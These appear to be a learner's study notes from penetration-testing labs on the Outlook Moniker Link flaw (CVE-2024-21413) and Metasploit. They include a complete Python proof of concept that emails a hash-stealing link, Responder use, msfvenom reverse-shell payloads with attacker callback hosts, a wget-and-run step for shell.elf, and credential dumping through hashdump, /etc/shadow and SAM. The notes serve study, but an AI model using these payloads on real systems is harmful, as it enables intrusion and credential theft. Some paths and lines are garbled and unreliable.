- **[[Remote Code Execution]]** : (RCE) is a **vulnerability** that allows an attacker to run arbitrary code on a remote system. If exploited successfully, it often leads to full system compromise.
- **[[moniker link]]** : **Moniker Links** refer to _"short names or aliases that point to specific objects or resources"_ in a system, especially in software or Windows environments. Think of them as **nicknames or pointers** used to reference a file, application, or system object.
	- A moniker can link to a document on disk.
	- It can be used to automatically open or activate that document or component when needed.
	- Moniker links can be saved and used later to reconnect to the same object.
- **COM ([[Component Object Model]])** is a **[[Microsoft]] technology** used for building **reusable software components** that can **communicate with each other** — even if they were created using different programming languages.
___
# **Moniker Link (CVE-2024-21413)**
1. **Outlook supports HTML**: So emails can contain clickable links, images, buttons, etc.
2. **It can also handle links to local files or apps**, using a special format like:    
    `<a href="file://192.168.1.10/test">Click me</a>`
3. Normally, **Outlook blocks risky actions** using **Protected View**, especially things that launch external apps or access local/network files.
4. **Attackers discovered a bypass** using the `!` character in a Moniker Link like:
	    `<a href="file://192.168.1.10/test!exploit">Click me</a>`.
___
### Exploitation 
```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```


- Takes an attacker & victim email. Normally, you would need to use your own SMTP server (this has already been provided for you in this room)
- Requires the password to authenticate. For this room, the password for attacker@monikerlink.thm is **attacker**
- Contains the email content (html_content), which contains our Moniker Link as a HTML hyperlink
- Then, fill in the "subject", "from" and "to" fields in the email
- Finally, it sends the email to the mail server
___
-  Modify the Moniker Link (line #12) in our PoC to reflect the IP address of our AttackBox
- Replace the MAILSERVER placeholder on line #31 with 10.10.90.37
----
- [[SMB listner]] :`responder -I wlan0`
will capture the [[netNTLMv2]] hash
___
root@attackbox:# python3 exploit.py
Enter your attacker email password: attacker
___
open the mail box an "click me"
___
![[Pasted image 20250722202116.png]]
___
### Detection
A [Yara rule](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar) has been created by [Florian Roth](https://twitter.com/cyb3rops/status/1758792873254744344) to detect emails containing the `file:\\` element in the Moniker Link.
___
Additionally, the SMB request from the victim to the client can be seen in a packet capture with a truncated netNTLMv2 hash.
___
# **Metasploit: Introduction**
- The [[Metasploit]] Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more.
- The main components of the Metasploit Framework can be summarized as follows;
	- **`msfconsole`**: The main command-line interface.
	- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
	- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing.
### [[Auxiliary]]
- Any supporting module, such as scanners, crawlers and fuzzers, can be found here: `/usr/share/metasploit-framework/modules/evasion`
### [[Encoders]]
- Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
- Signature-based antivirus and security solutions have a database of known threats.  `/usr/share/metasploit-framework/modules/evasionè
### [[Evasion]]
- While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success. `/usr/share/metasploit-framework/modules/evasion`
### [[Exploits]]
- Exploits, neatly organized by target system.
- `/usr/share/metasploit-framework/modules/exploits`
### [[NOPs]]
- NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
- `/usr/share/metasploit-framework/modules/nops `
### **[[payloads]]**
- Payloads are codes that will run on the target system.
- You will see four different directories under payloads: adapters, singles, stagers and stages.
### **[[Adapters]]**
- Convert **single payloads** into different formats (e.g., PowerShell command).
### **[[Singles]]**
- **Standalone** payloads (e.g., add user, open app).
- No extra downloads needed.
### **[[Stagers]]**
- Set up a **connection** to receive the full payload.
- Small size, helps avoid detection.
### **[[Stages]]**
- The **main payload** delivered after stager runs.
- Can be large and complex.
### **[[Post]]**
- Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.
___
## **msfconsole**
- can be used just like a regular command-line [[shell]]
- `use module_name`
- `show options`: tells us we now have a context set in which we will work.
- The `show` command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.)
- `back`: leave context
- `info module_name`: Further information on any module
- `search`:search the Metasploit Framework database for modules relevant to the given search parameter
- example : `search type:auxiliary telnet`
___
## Working with modules
- `set PARAMETER_NAME VALUE`
- ***msfconsole prompts :***
	- **The regular command prompt**: root@ip-10-10-XX-XX:~#
	- **The msfconsole prompt:** msf6 >
	- **A context prompt:** msf6 exploit(windows/smb/ms17_010_eternalblue) >
	- **The Meterpreter prompt:** meterpreter >
	- **A shell on the target system:** C:\Windows\system32>
- `set`: set $rhosts$ 10.10.165.39
- **prameters :**
	- **RHOSTS:** “Remote host”, the IP address of the target system
	- **RPORT:** “Remote port”, the port on the target system the vulnerable application is running on.
	- **PAYLOAD:** The payload you will use with the exploit.
	- **LHOST:** “Localhost”, the attacking machine.
	- **LPORT:** “Local port”, This is a port on your attacking machine
	- **SESSION:** Each connection established to the target system using Metasploit will have a session ID.
- `unset` / `unsetall` : clear parameters
- `setg` : set values that will be used for all modules (`unsetg` clear).
-  `exploit` : launch the module once all parameters are set.
- `exploit -z` :run the exploit and background the session as soon as it opens.
- `check` : check if the target system is vulnerable without exploiting it.
- `background` :background the session prompt and go back to the msfconsole prompt.
- `sessions` :can be used from the msfconsole prompt or any context to see the existing sessions
- `sessions -i SESSION_NUMBER`:interact with the session
___
# Metasploit: Exploitation

## scanning
- **parameters**
	- **CONCURRENCY:** Number of targets to be scanned simultaneously.
	- **PORTS:** Port range to be scanned. 
	- **RHOSTS:** Target or target network to be scanned.
	- **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.
**[[UDP]] service Identification**
- `scanner/discovery/udp_sweep`: allow you to quickly identify services running over the UDP.
**[[SMB]] Scans**
- useful in a corporate network would be `smb_enumshares` and `smb_version`

When performing service scans, it would be important not to omit more "exotic" services such as [[NetBIOS]].
`serch smb_login`get password
___
## The metasploit database
- `systemctl start postgresql`: [[postgresql]]
- `msfdb init` : initialize the Metasploit Database
- The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the `workspace` command.
- `workspace -a tryhackme`
- navigate between workspaces : `workspace NAME`
- `workspace -h`
- `help`
- `hosts -R` : add this value to the RHOSTS parameter.
- [[HTTP]]: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
- [[FTP]]: Could allow anonymous login and provide access to interesting files.
- [[SMB]]: Could be vulnerable to SMB exploits like MS17-010
- [[SSH]]: Could have default or easy to guess credentials
- [[RDP]]: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.
___
## Vulnerability Scanning
- [[VNC]] service : **VNC (Virtual Network Computing)** is a **remote desktop sharing system** that allows you to **control another computer** over a network connection as if you were sitting in front of it.
- **[[fingerprinting]]** :refers to the process of **gathering information about a system, device, or application to identify it and its vulnerabilities**.
___
### msfvenom
-  allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).
- **encoders** do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload.
- **[[Meterpreter]]** is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code. It is typically deployed using in-memory DLL injection to reside entirely in memory.
- `LHOST=10.10.186.44 -f raw -e php/base64` :encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.
#### Handlers
- **Reverse Shell**: Target connects back to attacker. Used to bypass firewalls.
- **Handler**: Listens for reverse connections and catches the shell.
- **Catching a Shell**: Receiving a connection from a payload executed on the target.
- `msfvenom -p <payload> LHOST=<attacker_IP> LPORT=<port> -f <format> [-e <encoder>]`
#### Encoders
- Encoders **do not bypass antivirus** by default.
- Purpose: **Encode payloads**, e.g., in Base64 (`php/base64`).
- `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`
- ==**note**== dont forget to edit php file(`/*<?php ... `-->`<?php`)
#### Setting Up the Listener (Handler)
- use exploit/multi/handler
	set payload php/reverse_php
	set LHOST 10.0.2.19
	set LPORT 7777
	run
#### exercice notes
- Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier. : `sudo ssh muryphy@ip`
- Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice). : `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
- Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine).  `chmod 777 shell.elf`  -> `./shell.elf`
- Get a meterpreter session on the target machine. `use exploit/multi/handler` -> `set payload linux/x86/meterpreter/reverse_tcp`
- Use a post exploitation module to dump hashes of other users on the system. `cat etc/shadow`
___
# Metasploit : meterpreter
- **def** : [[Meterpreter]] is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will ==run on the target system== and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.
- ==runs in memory and does not write itself to the disk on the target.==
-  [[IPS]] (Intrusion Prevention System) and [[IDS]] (Intrusion Detection System).
- `msfvenom --list payloads | grep meterpreter` : get available versions
- `help` :
	- The `getuid` command will display the user with which Meterpreter is currently running.
	- The `ps` command will list running processes.
	- Migrating to another process will help Meterpreter interact with it.: `migrate PROCESS_ID`
	- The `hashdump` command will list the content of the [[SAM]] database
	- The `search` command is useful to locate files with potentially juicy information:`search -f flag.txt`
	- The shell command will launch a regular command-line shell on the target system.
	- `load`: load command to leverage additional tools such as Kiwi or even the whole Python language.
	- `cat C:\\inetpub\\wwwroot\\realsecret.txt`
___
- shell to meterpreter `use post/multi/manage/shell_to_meterpreter`
- windows pass wordss are stores in `C:\Windows\System32\config\SAM` SAM ([[Security Account Manager]])